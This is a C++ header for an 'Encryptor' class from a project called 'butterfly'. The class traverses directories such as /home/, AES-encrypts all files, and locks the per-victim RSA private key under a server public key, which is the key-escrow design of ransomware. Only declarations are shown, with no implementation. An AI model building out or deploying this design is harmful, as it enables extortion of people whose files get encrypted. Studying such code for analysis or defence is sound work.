
#ifndef BUTTERFLY_ENCRYPTOR_H
#define BUTTERFLY_ENCRYPTOR_H

#include "crypto/rsaEncryptor.h"
#include "crypto/aesEncryptor.h"
#include "crypto/serverPublicKey.h"
#include "directoryIterator.h"
#include "aesKeyDatabase.h"
#include "params.h"

namespace butterfly
{

namespace hybrid
{

/**
 * Class Encryptor to encrypt all files with AES and the CPrivateRSA as well as AES key with RSA
 */
class Encryptor
{

private:
    int _keySize;
    std::string _aesKeyDbFilepath;
    std::unique_ptr<rsa::RSAEncryptor> _rsaEncryptorAESKey, _rsaEncryptorCPrivateRSA;
    std::unique_ptr<aes::AESEncryptor> _aesEncryptor;
    std::unique_ptr<DirectoryIterator> _dirIterator;
    std::unique_ptr<AESKeyDatabase> _aesKeyDatabase;

public:
    /**
     * Constructor Encryptor
     *
     *  Usage:
     *       std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
     *       encryptor->invokeDir("/home/");
     *
     * @param keySize: size of the key
     * @param aesKeyDbFilepath:
     */
    explicit Encryptor(int keySize = 2048, const std::string &aesKeyDbFilepath = "/home/christian/projects/butterfly/bin/AES.db");

    /**
     * Destructor Encryptor
     */
    ~Encryptor();

    /**
     * Invokes the provided directory path
     *
     * @param path: path of the directory
     */
    void invokeDir(const std::string &path);

    /**
     * Encrypts the CPrivateRSA.pem and saves the CPrivateRSA.bin file on the host machine
     */
    void encryptCPrivateRSA();

    /**
     * Encrypts all files with AES
     *
     * @param filepath: path of the file
     */
    void encryptFileWithAES(const std::string &filepath);

    /**
     * Encrypts the final AES Key and IV with RSA
     *
     * @param aesKeyStr: AES Key or IV String
     * @param filename: name of the encrypted file
     */
    void encryptFinalAESKeyWithRSA(const std::string aesKeyStr, const std::string filename, const std::string &type);

    void encryptAESKeyFile(const std::string &filepath);
};

} // namespace hybrid

} // namespace butterfly

#endif //BUTTERFLY_ENCRYPTOR_H
